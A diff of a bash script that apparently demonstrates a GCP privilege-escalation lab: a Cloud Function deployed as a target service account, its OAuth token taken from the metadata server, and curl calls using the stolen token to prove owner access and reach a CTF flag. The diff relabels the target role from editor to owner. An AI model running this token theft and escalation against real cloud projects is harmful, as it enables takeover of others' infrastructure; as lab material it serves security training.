@@ -9,7 +9,7 @@
 # function's runtime to exfiltrate target_sa's OAuth access token, then calls
 # the function to trigger the exfiltration and uses the raw stolen token
 # directly against Google REST APIs (never re-impersonating via gcloud) to
-# prove it now holds target_sa's roles/editor project permissions.
+# prove it now holds target_sa's roles/owner project permissions.
 #
 # Modes:
 #   Default (gcloud): uses gcloud functions deploy with --build-service-account (explicit)
@@ -114,7 +114,7 @@ for var_name in STARTING_SA_EMAIL TARGET_SA_EMAIL FLAG_SECRET_ID PROJECT_ID REGI
 done
 
 echo "Starting SA (no project role): $STARTING_SA_EMAIL"
-echo "Target SA   (roles/editor):    $TARGET_SA_EMAIL"
+echo "Target SA   (roles/owner):     $TARGET_SA_EMAIL"
 echo "Deployer    (your ADC):        $DEPLOYER_EMAIL"
 echo "Region:                        $REGION"
 echo "Project:                       $PROJECT_ID"
@@ -463,9 +463,9 @@ if [ "$TOKEN_EMAIL" != "$TARGET_SA_EMAIL" ]; then
 fi
 echo -e "${GREEN}✓ Confirmed: exfiltrated token belongs to $TARGET_SA_EMAIL${NC}\n"
 
-# Step 7: [EXPLOIT] Confirm editor-level write access using the raw stolen
+# Step 7: [EXPLOIT] Confirm owner-level write access using the raw stolen
 # token (project label write/remove round-trip) — not gcloud impersonation.
-echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/editor write access via raw stolen token${NC}"
+echo -e "${YELLOW}Step 7: [EXPLOIT] Verifying roles/owner write access via raw stolen token${NC}"
 show_cmd "$TARGET_SA_EMAIL (via exfiltrated token)" \
     "curl -X PATCH 'https://cloudresourcemanager.googleapis.com/v1/projects/$PROJECT_ID?updateMask=labels' -H 'Authorization: Bearer <redacted>' -d '{\"labels\": {...}}'"
 
@@ -482,7 +482,7 @@ PATCH_RESPONSE=$(curl -s -X PATCH \
 
 if echo "$PATCH_RESPONSE" | jq -e '.name' >/dev/null 2>&1; then
     echo -e "${GREEN}✓ Successfully wrote a project label using the exfiltrated token!${NC}"
-    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+    echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
     curl -s -X PATCH \
         -H "Authorization: Bearer ${EXFILTRATED_TOKEN}" \
         -H "Content-Type: application/json" \
@@ -538,7 +538,7 @@ echo "  $STARTING_SA_EMAIL"
 echo "    -> (iam.serviceAccounts.actAs on target_sa + cloudfunctions.functions.create/.sourceCodeSet + run.routes.invoke — THE VULNERABILITY)"
 echo "    -> Cloud Function '$FUNCTION_NAME' deployed and running as $TARGET_SA_EMAIL"
 echo "    -> exfiltrated OAuth access token (via metadata server)"
-echo "    -> (roles/editor on project $PROJECT_ID)"
+echo "    -> (roles/owner on project $PROJECT_ID)"
 echo "    -> CTF Flag"
 
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
